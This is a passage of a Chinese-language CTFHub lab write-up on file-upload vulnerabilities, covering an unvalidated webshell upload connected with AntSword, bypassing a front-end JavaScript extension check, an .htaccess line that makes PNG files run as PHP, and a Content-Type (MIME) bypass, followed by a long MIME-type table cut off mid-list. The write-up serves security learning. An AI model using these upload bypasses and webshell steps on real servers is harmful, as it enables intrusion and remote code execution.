&#125;%&gt; 在大多数情况下，要完成文件上传漏洞这个攻击，要满足如下几个条件： 首先，上传的文件能够被 Web 容器解释执行。所以文件上传后所在的目录要是 Web 容器所覆盖到的路径。 其次，用户能够从 Web 上访问这个文件。如果文件上传了，但用户无法通过 Web 访问，或者无法使得 Web容器解释这个脚本，那么也不能称之为漏洞。 最后，用户上传的文件若被安全检查、格式化、图片压缩等功能改变了内容，则也可能导致攻击不成功。 CTF Hub 文件上传无验证因为没有验证，所以可以直接上传一个一句话木马： 通过提示得知一句话木马的路径为： 1http://x.x.x.x:10080/upload/shell.php 蚁剑连接在网站根目录下可以找到 flag 的 PHP 文件，打开即可获得 Flag 前端验证一般弹窗都是前端验证 JS 前端验证，上传一个 shell.php 发现提示不允许上传： 审查元素发现 JS 代码中出现了文件后缀判断的代码： 123456789101112131415161718192021&lt;script&gt;function checkfilesuffix()&#123; var file=document.getElementsByName('file')[0]['value']; if(file==""||file==null) &#123; alert("请添加上传文件"); return false; &#125; else &#123; var whitelist=new Array(".jpg",".png",".gif"); var file_suffix=file.substring(file.lastIndexOf(".")); if(whitelist.indexOf(file_suffix) == -1) &#123; alert("该文件不允许上传"); return false; &#125; &#125;&#125;&lt;/script&gt; 可以直接通过 Chrome 来调试这窜 JS 进行绕过，下断点直接修改值： 断点要从26行下移到27行然后放包 本题通过 BP 抓包也是可以直接绕过的，正常的思路一般就是直接通过 BP 抓包，这里的 JS 调试只当做是一个小技巧来学习，并不是主流的上传绕过方式。 .htaccesshtaccess 文件是 Apache 服务器中的一个配置文件，它负责相关目录下的网页配置。通过 htaccess 文件，可以帮我们实现：网页 301 重定向、自定义 404 错误页面、改变文件扩展名、允许/阻止特定的用户或者目录的访问、禁止目录列表、配置默认文档等功能 先上传一个名为.htaccess的文件，内容为： 1AddType application/x-httpd-php .png 这表示让 png 后缀的文件当做 PHP 来解析： 此时上传一个 png 图片，但是图片内容是 PHP： 此时使用中国蚁剑可以直接连接成功 MIME 绕过媒体类型（通常称为 Multipurpose Internet Mail Extensions 或 MIME 类型 ）是一种标准，用来表示文档、文件或字节流的性质和格式。 本关直接修改 Content-Type 即可实现上传绕过： MimeTypes表 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141142143144145146147148149150151152153154155156157158159160161162163164165166167168169170171172173174175176177178179180181182183184185186187188189190191192193194195196197198199200201202203204205206207208209210211212213214215216217218219220221222223224225226227228229230231232233234235236237238239240241242243244245246247248249250251252253254255256257258259260261262263264265266267268269270271272273274275276277278279280mimes = [(&quot;ez&quot;, &quot;application/andrew-inset&quot;), (&quot;anx&quot;, &quot;application/annodex&quot;), (&quot;atom&quot;, &quot;application/atom+xml&quot;), (&quot;atomcat&quot;, &quot;application/atomcat+xml&quot;), (&quot;atomsrv&quot;, &quot;application/atomserv+xml&quot;), (&quot;lin&quot;, &quot;application/bbolin&quot;), (&quot;cap&quot;, &quot;application/cap&quot;), (&quot;pcap&quot;, &quot;application/cap&quot;), (&quot;cu&quot;, &quot;application/cu-seeme&quot;), (&quot;davmount&quot;, &quot;application/davmount+xml&quot;), (&quot;tsp&quot;, &quot;application/dsptype&quot;), (&quot;es&quot;, &quot;application/ecmascript&quot;), (&quot;spl&quot;, &quot;application/futuresplash&quot;), (&quot;hta&quot;, &quot;application/hta&quot;), (&quot;jar&quot;, &quot;application/java-archive&quot;), (&quot;ser&quot;, &quot;application/java-serialized-object&quot;), (&quot;class&quot;, &quot;application/java-vm&quot;), (&quot;js&quot;, &quot;application/javascript&quot;), (&quot;m3g&quot;, &quot;application/m3g&quot;), (&quot;hqx&quot;, &quot;application/mac-binhex40&quot;), (&quot;cpt&quot;, &quot;application/mac-compactpro&quot;), (&quot;nb&quot;, &quot;application/mathematica&quot;), (&quot;nbp&quot;, &quot;application/mathematica&quot;), (&quot;mdb&quot;, &quot;application/msaccess&quot;), (&quot;doc&quot;, &quot;application/msword&quot;), (&quot;dot&quot;, &quot;application/msword&quot;), (&quot;mxf&quot;, &quot;application/mxf&quot;), (&quot;bin&quot;, &quot;application/octet-stream&quot;), (&quot;oda&quot;, &quot;application/oda&quot;), (&quot;ogx&quot;, &quot;application/ogg&quot;), (&quot;pdf&quot;, &quot;application/pdf&quot;), (&quot;key&quot;, &quot;application/pgp-keys&quot;), (&quot;pgp&quot;, &quot;application/pgp-signature&quot;), (&quot;prf&quot;, &quot;application/pics-rules&quot;), (&quot;ps&quot;, &quot;application/postscript&quot;), (&quot;ai&quot;, &quot;application/postscript&quot;), (&quot;eps&quot;, &quot;application/postscript&quot;), (&quot;epsi&quot;, &quot;application/postscript&quot;), (&quot;epsf&quot;, &quot;application/postscript&quot;), (&quot;eps2&quot;, &quot;application/postscript&quot;), (&quot;eps3&quot;, &quot;application/postscript&quot;), (&quot;rar&quot;, &quot;application/rar&quot;), (&quot;rdf&quot;, &quot;application/rdf+xml&quot;), (&quot;rss&quot;, &quot;application/rss+xml&quot;), (&quot;rtf&quot;, &quot;application/rtf&quot;), (&quot;smi&quot;, &quot;application/smil&quot;), (&quot;smil&quot;, &quot;application/smil&quot;), (&quot;xhtml&quot;, &quot;application/xhtml+xml&quot;), (&quot;xht&quot;, &quot;application/xhtml+xml&quot;), (&quot;xml&quot;, &quot;application/xml&quot;), (&quot;xsl&quot;, &quot;application/xml&quot;), (&quot;xsd&quot;, &quot;application/xml&quot;), (&quot;xspf&quot;, &quot;application/xspf+xml&quot;), (&quot;zip&quot;, &quot;application/zip&quot;), (&quot;apk&quot;, &quot;application/vnd.android.package-archive&quot;), (&quot;cdy&quot;, &quot;application/vnd.cinderella&quot;), (&quot;kml&quot;, &quot;application/vnd.google-earth.kml+xml&quot;), (&quot;kmz&quot;, &quot;application/vnd.google-earth.kmz&quot;), (&quot;xul&quot;, &quot;application/vnd.mozilla.xul+xml&quot;), (&quot;xls&quot;, &quot;application/vnd.ms-excel&quot;), (&quot;xlb&quot;, &quot;application/vnd.ms-excel&quot;), (&quot;xlt&quot;, &quot;application/vnd.ms-excel&quot;), (&quot;cat&quot;, &quot;application/vnd.ms-pki.seccat&quot;), (&quot;stl&quot;, &quot;application/vnd.ms-pki.stl&quot;), (&quot;ppt&quot;, &quot;application/vnd.ms-powerpoint&quot;), (&quot;pps&quot;, &quot;application/vnd.ms-powerpoint&quot;), (&quot;xlsx&quot;, &quot;application/vnd.openxmlformats-officedocument.spreadsheetml.sheet&quot;), ( &quot;xltx&quot;, &quot;application/vnd.openxmlformats-officedocument.spreadsheetml.template&quot;), ( &quot;pptx&quot;, &quot;application/vnd.openxmlformats-officedocument.presentationml.presentation&quot;), ( &quot;ppsx&quot;, &quot;application/vnd.openxmlformats-officedocument.presentationml.slideshow&quot;), ( &quot;potx&quot;, &quot;application/vnd.openxmlformats-officedocument.presentationml.template&quot;), ( &quot;docx&quot;, &quot;application/vnd.openxmlformats-officedocument.wordprocessingml.document&quot;), ( &quot;dotx&quot;, &quot;application/vnd.openxmlformats-officedocument.wordprocessingml.template&quot;), (&quot;cod&quot;, &quot;application/vnd.rim.cod&quot;), (&quot;mmf&quot;, &quot;application/vnd.smaf&quot;), (&quot;sis&quot;, &quot;application/vnd.symbian.install&quot;), (&quot;vsd&quot;, &quot;application/vnd.visio&quot;), (&quot;wbxml&quot;, &quot;application/vnd.wap.wbxml&quot;), (&quot;wmlc&quot;, &quot;application/vnd.wap.wmlc&quot;), (&quot;wmlsc&quot;, &quot;application/vnd.wap.wmlscriptc&quot;), (&quot;wpd&quot;, &quot;application/vnd.wordperfect&quot;), (&quot;wp5&quot;, &quot;application/vnd.wordperfect5.1&quot;), (&quot;wk&quot;, &quot;application/x-123&quot;), (&quot;7z&quot;, &quot;application/x-7z-compressed&quot;), (&quot;abw&quot;, &quot;application/x-abiword&quot;), (&quot;dmg&quot;, &quot;application/x-apple-diskimage&quot;), (&quot;bcpio&quot;, &quot;application/x-bcpio&quot;), (&quot;torrent&quot;, &quot;application/x-bittorrent&quot;), (&quot;cab&quot;, &quot;application/x-cab&quot;), (&quot;cbr&quot;, &quot;application/x-cbr&quot;), (&quot;cbz&quot;, &quot;application/x-cbz&quot;), (&quot;cdf&quot;, &quot;application/x-cdf&quot;), (&quot;cda&quot;, &quot;application/x-cdf&quot;), (&quot;vcd&quot;, &quot;application/x-cdlink&quot;), (&quot;pgn&quot;, &quot;application/x-chess-pgn&quot;), (&quot;cpio&quot;, &quot;application/x-cpio&quot;), (&quot;csh&quot;, &quot;application/x-csh&quot;), (&quot;deb&quot;, &quot;application/x-debian-package&quot;), (&quot;udeb&quot;, &quot;application/x-debian-package&quot;), (&quot;dcr&quot;, &quot;application/x-director&quot;), (&quot;dir&quot;, &quot;application/x-director&quot;), (&quot;dxr&quot;, &quot;application/x-director&quot;), (&quot;dms&quot;, &quot;application/x-dms&quot;), (&quot;wad&quot;, &quot;application/x-doom&quot;), (&quot;dvi&quot;, &quot;application/x-dvi&quot;), (&quot;rhtml&quot;, &quot;application/x-httpd-eruby&quot;), (&quot;pfa&quot;, &quot;application/x-font&quot;), (&quot;pfb&quot;, &quot;application/x-font&quot;), (&quot;gsf&quot;, &quot;application/x-font&quot;), (&quot;pcf&quot;, &quot;application/x-font&quot;), (&quot;pcf.Z&quot;, &quot;application/x-font&quot;), (&quot;mm&quot;, &quot;application/x-freemind&quot;), (&quot;spl&quot;, &quot;application/x-futuresplash&quot;), (&quot;gnumeric&quot;, &quot;application/x-gnumeric&quot;), (&quot;sgf&quot;, &quot;application/x-go-sgf&quot;), (&quot;gcf&quot;, &quot;application/x-graphing-calculator&quot;), (&quot;gtar&quot;, &quot;application/x-gtar&quot;), (&quot;tgz&quot;, &quot;application/x-gtar&quot;), (&quot;taz&quot;, &quot;application/x-gtar&quot;), (&quot;hdf&quot;, &quot;application/x-hdf&quot;), (&quot;phtml&quot;, &quot;application/x-httpd-php&quot;), (&quot;pht&quot;, &quot;application/x-httpd-php&quot;), (&quot;php&quot;, &quot;application/x-httpd-php&quot;), (&quot;phps&quot;, &quot;application/x-httpd-php-source&quot;), (&quot;php3&quot;, &quot;application/x-httpd-php3&quot;), (&quot;php3p&quot;, &quot;application/x-httpd-php3-preprocessed&quot;), (&quot;php4&quot;, &quot;application/x-httpd-php4&quot;), (&quot;php5&quot;, &quot;application/x-httpd-php5&quot;), (&quot;ica&quot;, &quot;application/x-ica&quot;), (&quot;info&quot;, &quot;application/x-info&quot;), (&quot;ins&quot;, &quot;application/x-internet-signup&quot;), (&quot;isp&quot;, &quot;application/x-internet-signup&quot;), (&quot;iii&quot;, &quot;application/x-iphone&quot;), (&quot;iso&quot;, &quot;application/x-iso9660-image&quot;), (&quot;jam&quot;, &quot;application/x-jam&quot;), (&quot;jnlp&quot;, &quot;application/x-java-jnlp-file&quot;), (&quot;jmz&quot;, &quot;application/x-jmol&quot;), (&quot;chrt&quot;, &quot;application/x-kchart&quot;), (&quot;kil&quot;, &quot;application/x-killustrator&quot;), (&quot;skp&quot;, &quot;application/x-koan&quot;), (&quot;skd&quot;, &quot;application/x-koan&quot;), (&quot;skt&quot;, &quot;application/x-koan&quot;), (&quot;skm&quot;, &quot;application/x-koan&quot;), (&quot;kpr&quot;, &quot;application/x-kpresenter&quot;), (&quot;kpt&quot;, &quot;application/x-kpresenter&quot;), (&quot;ksp&quot;, &quot;application/x-kspread&quot;), (&quot;kwd&quot;, &quot;application/x-kword&quot;), (&quot;kwt&quot;, &quot;application/x-kword&quot;), (&quot;latex&quot;, &quot;application/x-latex&quot;), (&quot;lha&quot;, &quot;application/x-lha&quot;), (&quot;lyx&quot;, &quot;application/x-lyx&quot;), (&quot;lzh&quot;, &quot;application/x-lzh&quot;), (&quot;lzx&quot;, &quot;application/x-lzx&quot;), (&quot;frm&quot;, &quot;application/x-maker&quot;), (&quot;maker&quot;, &quot;application/x-maker&quot;), (&quot;frame&quot;, &quot;application/x-maker&quot;), (&quot;fm&quot;, &quot;application/x-maker&quot;), (&quot;fb&quot;, &quot;application/x-maker&quot;), (&quot;book&quot;, &quot;application/x-maker&quot;), (&quot;fbdoc&quot;, &quot;application/x-maker&quot;), (&quot;mif&quot;, &quot;application/x-mif&quot;), (&quot;wmd&quot;, &quot;application/x-ms-wmd&quot;), (&quot;wmz&quot;, &quot;application/x-ms-wmz&quot;), (&quot;com&quot;, &quot;application/x-msdos-program&quot;), (&quot;exe&quot;, &quot;application/x-msdos-program&quot;), (&quot;bat&quot;, &quot;application/x-msdos-program&quot;), (&quot;dll&quot;, &quot;application/x-msdos-program&quot;), (&quot;msi&quot;, &quot;application/x-msi&quot;), (&quot;nc&quot;, &quot;application/x-netcdf&quot;), (&quot;pac&quot;, &quot;application/x-ns-proxy-autoconfig&quot;), (&quot;dat&quot;, &quot;application/x-ns-proxy-autoconfig&quot;), (&quot;nwc&quot;, &quot;application/x-nwc&quot;), (&quot;o&quot;, &quot;application/x-object&quot;), (&quot;oza&quot;, &quot;application/x-oz-application&quot;), (&quot;p7r&quot;, &quot;application/x-pkcs7-certreqresp&quot;), (&quot;crl&quot;, &quot;application/x-pkcs7-crl&quot;), (&quot;pyc&quot;, &quot;application/x-python-code&quot;), (&quot;pyo&quot;, &quot;application/x-python-code&quot;), (&quot;qgs&quot;, &quot;application/x-qgis&quot;), (&quot;shp&quot;, &quot;application/x-qgis&quot;), (&quot;shx&quot;, &quot;application/x-qgis&quot;), (&quot;qtl&quot;, &quot;application/x-quicktimeplayer&quot;), (&quot;rpm&quot;, &quot;application/x-redhat-package-manager&quot;), (&quot;rb&quot;, &quot;application/x-ruby&quot;), (&quot;sh&quot;, &quot;application/x-sh&quot;), (&quot;shar&quot;, &quot;application/x-shar&quot;), (&quot;swf&quot;, &quot;application/x-shockwave-flash&quot;), (&quot;swfl&quot;, &quot;application/x-shockwave-flash&quot;), (&quot;scr&quot;, &quot;application/x-silverlight&quot;), (&quot;sit&quot;, &quot;application/x-stuffit&quot;), (&quot;sitx&quot;, &quot;application/x-stuffit&quot;), (&quot;sv4cpio&quot;, &quot;application/x-sv4cpio&quot;), (&quot;sv4crc&quot;, &quot;application/x-sv4crc&quot;), (&quot;tar&quot;, &quot;application/x-tar&quot;), (&quot;tcl&quot;, &quot;application/x-tcl&quot;), (&quot;gf&quot;, &quot;application/x-tex-gf&quot;), (&quot;pk&quot;, &quot;application/x-tex-pk&quot;), (&quot;texinfo&quot;, &quot;application/x-texinfo&quot;), (&quot;texi&quot;, &quot;application/x-texinfo&quot;), (&quot;~&quot;, &quot;application/x-trash&quot;), (&quot;%&quot;, &quot;application/x-trash&quot;), (&quot;bak&quot;, &quot;application/x-trash&quot;), (&quot;old&quot;, &quot;application/x-trash&quot;), (&quot;sik&quot;, &quot;application/x-trash&quot;), (&quot;t&quot;, &quot;application/x-troff&quot;), (&quot;tr&quot;, &quot;application/x-troff&quot;), (&quot;roff&quot;, &quot;application/x-troff&quot;), (&quot;man&quot;, &quot;application/x-troff-man&quot;), (&quot;me&quot;, &quot;application/x-troff-me&quot;), (&quot;ms&quot;, &quot;application/x-troff-ms&quot;), (&quot;ustar&quot;, &quot;application/x-ustar&quot;), (&quot;src&quot;, &quot;application/x-wais-source&quot;), (&quot;wz&quot;, &quot;application/x-wingz&quot;), (&quot;crt&quot;, &quot;application/x-x509-ca-cert&quot;), (&quot;xcf&quot;, &quot;application/x-xcf&quot;), (&quot;fig&quot;, &quot;application/x-xfig&quot;), (&quot;xpi&quot;, &quot;application/x-xpinstall&quot;), (&quot;amr&quot;, &quot;audio/amr&quot;), (&quot;awb&quot;, &quot;audio/amr-wb&quot;), (&quot;amr&quot;, &quot;audio/amr&quot;), (&quot;awb&quot;, &quot;audio/amr-wb&quot;), (&quot;axa&quot;, &quot;audio/annodex&quot;), (&quot;au&quot;, &quot;audio/basic&quot;), (&quot;snd&quot;, &quot;audio/basic&quot;), (&quot;flac&quot;, &quot;audio/flac&quot;), (&quot;mid&quot;, &quot;audio/midi&quot;), (&quot;midi&quot;, &quot;audio/midi&quot;), (&quot;kar&quot;, &quot;audio/midi&quot;), (&quot;mpga&quot;, &quot;audio/mpeg&quot;), (&quot;mpega&quot;, &quot;audio/mpeg&quot;), (&quot;mp2&quot;, &quot;audio/mpeg&quot;), (&quot;mp3&quot;, &quot;audio/mpeg&quot;), (&quot;m4a&quot;, &quot;audio/mpeg&quot;), (&quot;m3u&quot;, &quot;audio/mpegurl&quot;), (&quot;oga&quot;, &quot;audio/ogg&quot;), (&quot;ogg&quot;, &quot;audio/ogg&quot;), (&quot;spx&quot;, &quot;audio/ogg&quot;), (&quot;sid&quot;, &quot;audio/prs.sid&quot;), (&quot;aif&quot;, &quot;audio/x-aiff&quot;), (&quot;aiff&quot;, &quot;audio/x-aiff&quot;), (&quot;aifc&quot;, &quot;audio/x-aiff&quot;), (&quot;gsm&quot;, &quot;audio/x-gsm&quot;), (&quot;m3u&quot;, &quot;audio/x-mpegurl&quot;), (&quot;wma&quot;, &quot;audio/x-ms-wma&quot;), (&quot;wax&quot;, &quot;audio/x-ms-wax&quot;), (&quot;ra&quot;, &quot;audio/x-pn-realaudio&quot;), (&quot;rm&quot;, &quot;audio/x-pn-realaudio&quot;), (&quot;ram&quot;, &quot;audio/x-pn-realaudio&quot;), (&quot;ra&quot;, &quot;audio/x-realaudio&quot;), (&quot;pls&quot;, &quot;audio/x-scpls&quot;), (&quot;sd2&quot;, &quot;audio/x-sd2&quot;), (&quot;wav&quot;, &quot;audio/x-wav&quot;), (&quot;alc&quot;, &quot;chemical/x-alchemy&quot;), (&quot;cac&quot;, &quot;chemical/x-cache&quot;), (&quot;cache&quot;, &quot;chemical/x-cache&quot;), (&quot;csf&quot;, &quot;chemical/x-cache-csf&quot;), (&quot;cbin&quot;, &quot;chemical/x-cactvs-binary&quot;), (&quot;cascii&quot;, &quot;chemical/x-cactvs-binary&quot;), (&quot;ctab&quot;, &quot;chemical/x-cactvs-binary&quot;), (&quot;cdx&quot;, &quot;chemical/x-cdx&quot;), (&quot;cer&quot;, &quot;chemical/x-cerius&quot;), (&quot;c3d&quot;, &quot;chemical/x-chem3d&quot;), (&quot;chm&quot;, &quot;chemical/x-chemdraw&quot;), (&quot;cif&quot;, &quot;chemical/x-cif&quot;), (&quot;cmdf&quot;, &quot;chemical/x-cmdf&quot;), (&quot;cml&quot;, &quot;chemical/x-cml&quot;), (&quot;cpa&quot;, &quot;chemical/x-compass&quot;), (&quot;bsd&quot;, &quot;chemical/x-crossfire&quot;), (&quot;csml&quot;, &quot;chemical/x-csml&quot;), (&quot;csm&quot;, &quot;chemical/x-csml&quot;), (&quot;ctx&quot;, &quot;chemical/x-ctx&quot;), (&quot;cxf&quot;, &quot;chemical/x-cxf&quot;), (&quot;cef&quot;, &quot;chemical/x-cxf&quot;), (&quot;smi&quot;, &quot;#chemical/x-daylight-smiles&quot;), (&quot;emb&quot;, &quot;chemical/x-embl-dl-nucleotide&quot;), (&quot;embl&quot;, &quot;chemical/x-embl-dl-nucleotide&quot;), (&quot;spc&quot;, &quot;chemical/x-galactic-spc&quot;), (&quot;inp&quot;, &quot;chemical/x-gamess-input&quot;), (&quot;gam&quot;, &quot;chemical/x-gamess-input&quot;), (&quot;gamin&quot;, &quot;chemical/x-gamess-input&quot;), (&quot;fch&quot;, &quot;chemical/x-gaussian-checkpoint&quot;), (&quot;fchk&quot;, &quot;chemical/x-gaussian-checkpoint&quot;), (&quot;cub&quot;, &quot;chemical/x-gaussian-cube&quot;), (&quot;gau&quot;, &quot;chemical/x-gaussian-input&quot;), (&quot;gjc&quot;, &quot;chemical/x-gaussian-input&quot;), (&quot;gjf&quot;, &quot;chemical/x-gaussian-input&quot;), (&quot;gal&quot;, &quot;chemical/x-gaussian-log&quot;), (&quot;gcg&quot;, &quot;chemical/x-gcg8-sequence&quot;), (&quot;gen&quot;, &quot;chemical/x-genbank&quot;), (&quot;hin&quot;, &quot;chemical/x-hin&quot;), (&quot;istr&quot;, &quot;chemical/x-isostar&quot;), (&quot;ist&quot;, &quot;chemical/x-isostar&quot;), (&quot;jdx&quot;, &quot;chemical/x-jcamp-dx&quot;), (&quot;dx&quot;, &quot;chemical/x-jcamp-dx&quot;), (&quot;kin&quot;, &quot;chemical/x-kinemage&quot;), (&quot;mcm&quot;, &quot;chemical/x-macmolecule&quot;), (&quot;mmd&quot;, &quot;chemical/x-macromodel-input&quot;), (&quot;mmod&quot;, &quot;chemical/x-macromodel-input&quot;), (&quot;mol&quot;, &quot;chemical/x-mdl-molfile&quot;), (&quot;rd&quot;, &quot;chemical/x-mdl-rdfile&quot;), (&quot;rxn&quot;, &quot;chemical/x-mdl-rxnfile&quot;), (&quot;sd&quot;, &quot;chemical/x-mdl-sdfile&quot;), (&quot;sdf&quot;, &quot;chemical/x-mdl-sdfile&quot;), (&quot;tgf&quot;, &quot;chemical/x-mdl-tgf&quot;), (&quot;mif&quot;, &quot;#chemical/x-mif&quot;), (&quot;mcif&quot;, &quot;chemical/x-mmcif&quot;), (&quot;mol2&quot;, &quot;chemical/x-mol2&quot;), (&quot;b&quot;, &quot;chemical/x-molconn-Z&quot;), (&quot;gpt&quot;, &quot;chemical/x-mopac-graph&quot;), (&quot;mop&quot;, &quot;chemical/x-mopac-input&quot;), (&quot;mopcrt&quot;, &quot;chemical/x-mopac-input&quot;), (&quot;mpc&quot;, &quot;chemical/x-mopac-input&quot;), (&quot;zmt&quot;, &quot;chemical/x-mopac-input&quot;), (&quot;moo&quot;, &quot;chemical/x-mopac-out&quot;), (&quot;mvb&quot;, &quot;chemical/x-mopac-vib&quot;), (&quot;asn&quot;, &quot;chemical/x-ncbi-asn1&quot;), (&quot;prt&quot;, &quot;chemical/x-ncbi-asn1-ascii&quot;), (&quot;ent&quot;, &quot;chemical/x-ncbi-asn1-ascii&quot;), (&quot;val&quot;, &quot;chemical/x-ncbi-asn1-binary&quot;), (&quot;aso&quot;, &quot;chemical/x-ncbi-asn1-binary&quot;), (&quot;asn&quot;, &quot;chemical/x-ncbi-asn1-spec&quot;), (&quot;pdb&quot;, &quot;chemical/x-pdb&quot;), (&quot;ent&quot;, &quot;chemical/x-pdb&quot;), (&quot;ros&quot;, &quot;chemical/x-rosdal&quot;), (&quot;sw&quot;, &quot;chemical/x-swissprot&quot;), (&quot;vms&quot;, &quot;chemical/x-vamas-iso14976&quot;), (&quot;vmd&quot;, &quot;chemical/x-vmd&quot;), (&quot;xtel&quot;, &quot;chemical/x-xtel&quot;), (&quot;xyz&quot;, &quot;chemical/x-xyz&quot;), (&quot;gif&quot;, &quot;image/gif&quot;), (&quot;ief&quot;, &quot;image/ief&quot;), (&quot;jpeg&quot;, &quot;image/jpeg&quot;), (&quot;jpg&quot;, &quot;image/jpeg&quot;), (&quot;jpe&quot;, &quot;image/jpeg&quot;), (&quot;pcx&quot;, &quot;image/pcx&quot;), (&quot;png&quot;, &quot;image/png&quot;), (&quot;svg&quot;, &quot;image/svg+xml&quot;), (&quot;svgz&quot;, &quot;image/svg+xml&quot;), (&quot;tiff&quot;, &quot;image/tiff&quot;), (&quot;tif&quot;, &quot;image/tiff&quot;), (&quot;djvu&quot;, &quot;image/vnd.djvu&quot;), (&quot;djv&quot;, &quot;image/vnd.djvu&quot;), (&quot;wbmp&quot;, &quot;image/vnd.wap.wbmp&quot;), (&quot;cr2&quot;, &quot;image/x-canon-cr2&quot;), (&quot;crw&quot;, &quot;image/x-canon-crw&quot;), (&quot;ras&quot;, &quot;image/x-cmu-raster&quot;), (&quot;cdr&quot;, &quot;image/x-coreldraw&quot;), (&quot;pat&quot;, &quot;image/x-coreldrawpattern&quot;), (&quot;cdt&quot;, &quot;image/x-coreldrawtemplate&quot;), (&quot;cpt&quot;, &quot;image/x-corelphotopaint&quot;), (&quot;erf&quot;, &quot;image/x-epson-erf&quot;), (&quot;ico&quot;, &quot;image/x-icon&quot;), (&quot;art&quot;, &quot;image/x-jg&quot;), (&quot;jng&quot;, &quot;image/x-jng&quot;), (&quot;bmp&quot;, &quot;image/x-ms-bmp&quot;), (&quot;nef&quot;, &quot;image/x-nikon-nef&quot;), (&quot;orf&quot;, &quot;image/x-olympus-orf&quot;), (&quot;psd&quot;, &quot;image/x-photoshop&quot;), (&quot;pnm&quot;, &quot;image/x-portable-anymap&quot;), (&quot;pbm&quot;, &quot;image/x-portable-bitmap&quot;), (&quot;pgm&quot;, &quot;image/x-portable-graymap&quot;), (&quot;ppm&quot;, &quot;image/x-portable-pixmap&quot;), (&quot;rgb&quot;, &quot;image/x-rgb&quot;), (&quot;xbm&quot;, &quot;image/x-xbitmap&quot;), (&quot;xpm&quot;, &quot;image/x-xpixmap&quot;), (&quot;xwd&quot;, &quot;image/x-xwindowdump&quot;), (&quot;eml&quot;, &quot;message/rfc822&quot;), (&quot;igs&quot;, &quot;model/iges&quot;), (&quot;iges&quot;, &quot;model/iges&quot;), (&quot;msh&quot;, &quot;model/mesh&quot;), (&quot;mesh&quot;, &quot;model/mesh&quot;), (&quot;silo&quot;, &quot;model/mesh&quot;), (&quot;wrl&quot;, &quot;model/vrml&quot;), (&quot;vrml&quot;, &quot;model/vrml&quot;), (&quot;x3dv&quot;, &quot;model/x3d+vrml&quot;), (&quot;x3d&quot;, &quot;model/x3d+xml&quot;), (&quot;x3db&quot;, &quot;model/x3d+binary&quot;), (&quot;manifest&quot;, &quot;text/cache-manifest&quot;), (&quot;ics&quot;, &quot;text/calendar&quot;), (&quot;icz&quot;, &quot;text/calendar&quot;), (&quot;css&quot;, &quot;text/css&quot;), (&quot;csv&quot;, &quot;text/csv&quot;), (&quot;323&quot;, &quot;text/h323&quot;), (&quot;html&quot;, &quot;text/html&quot;), (&quot;htm&quot;, &quot;text/html&quot;), (&quot;shtml&quot;, &quot;text/html&quot;), (&quot;uls&quot;, &quot;text/iuls&quot;), (&quot;mml&quot;, &quot;text/mathml&quot;), (&quot;asc&quot;, &quot;text/plain&quot;), (&quot;txt&quot;, &quot;text/plain&quot;), (&quot;text&quot;, &quot;text/plain&quot;), (&quot;pot&quot;, &quot;text/plain&quot;), (&quot;brf&quot;, &quot;text/plain&quot;), (&quot;rtx&quot;, &quot;text/richtext&quot;), (&quot;sct&quot;, &quot;text/scriptlet&quot;), (&quot;wsc&quot;, &quot;text/scriptlet&quot;), (&quot;tm&quot;, &quot;text/texmacs&quot;), (&quot;ts&quot;, &quot;text/texmacs&quot;), (&quot;tsv&quot;, &quot;text/tab-separated-values&quot;), (&quot;jad&quot;, &quot;text/vnd.sun.j2me.app-descriptor&quot;), (&quot;wml&quot;, &quot;text/vnd.wap.wml&quot;), (&quot;wmls&quot;, &quot;text/vnd.wap.wmlscript&quot;), (&quot;bib&quot;, &quot;text/x-bibtex&quot;), (&quot;boo&quot;, &quot;text/x-boo&quot;), (&quot;h++&quot;, &quot;text/x-c++hdr&quot;), (&quot;hpp&quot;, &quot;text/x-c++hdr&quot;), (&quot;hxx&quot;, &quot;text/x-c++hdr&quot;), (&quot;hh&quot;, &quot;text/x-c++hdr&quot;), (&quot;c++&quot;, &quot;text/x-c++src&quot;), (&quot;cpp&quot;, &quot;text/x-c++src&quot;), (&quot;cxx&quot;, &quot;text/x-c++src&quot;), (&quot;cc&quot;, &quot;text/x-c++src&quot;), (&quot;h&quot;, &quot;text/x-chdr&quot;), (&quot;htc&quot;, &quot;text/x-component&quot;), (&quot;csh&quot;, &quot;text/x-csh&quot;), (&quot;c&quot;, &quot;text/x-csrc&quot;), (&quot;d&quot;, &quot;text/x-dsrc&quot;), (&quot;diff&quot;, &quot;text/x-diff&quot;), (&quot;patch&quot;, &quot;text/x-diff&quot;), (&quot;hs&quot;, &quot;text/x-haskell&quot;), (&quot;java&quot;, &quot;text/x-java&quot;), (&quot;lhs&quot;, &quot;text/x-literate-haskell&quot;), (&quot;moc&quot;, &quot;text/x-moc&quot;), (&quot;p&quot;, &quot;text/x-pascal&quot;), (&quot;pas&quot;, &quot;text/x-pascal&quot;), (&quot;gcd&quot;, &quot;text/x-pcs-gcd&quot;), (&quot;pl&quot;, &quot;text/x-perl&quot;), (&quot;pm&quot;, &quot;text/x-perl&quot;), (&quot;py&quot;, &quot;text/x-python&quot;), (&quot;scala&quot;, &quot;text/x-scala&quot;), (&quot;etx&quot;, &quot;text/x-setext&quot;), (&quot;sh&quot;, &quot;text/x-sh&quot;), (&quot;tcl&quot;, &quot;text/x-tcl&quot;), (&quot;tk&quot;, &quot;text/x-tcl&quot;), (&quot;tex&quot;, &quot;text/x-tex&quot;), (&quot;ltx&quot;, &quot;text/x-tex&quot;), (&quot;sty&quot;, &quot;text/x-tex&quot;), (&quot;cls&quot;, &quot;text/x-tex&quot;), (&quot;vcs&quot;, &quot;text/x-vcalendar&quot;), (&quot;vcf&quot;, &quot;text/x-vcard&quot;), (&quot;3gp&quot;, &quot;video/3gpp&quot;), (&quot;axv&quot;, &quot;video/annodex&quot;), (&quot;dl&quot;, &quot;video/dl&quot;), (&quot;dif&quot;, &quot;video/dv&quot;), (&quot;dv&quot;, &quot;video/dv&quot;), (&quot;fli&quot;, &quot;video/fli&quot;), (&quot;gl&quot;, &quot;video/gl&quot;), (&quot;mpeg&quot;, &quot;video/mpeg&quot;), (&quot;mpg&quot;, &quot;video/mpeg&quot;), (&quot;mpe&quot;, &quot;video/mpeg&quot;), (&quot;mp4&quot;, &quot;video/mp4&quot;), (&quot;qt&quot;, &quot;video/quicktime&quot;), (&quot;mov&quot;, &quot;video/quicktime&quot;), (&quot;ogv&quot;, &quot;video/ogg&quot;), (&quot;mxu&quot;, &quot;video/vnd.mpegurl&quot;), (&quot;flv&quot;, &quot;video/x-flv&quot;), (&quot;lsf&quot;, 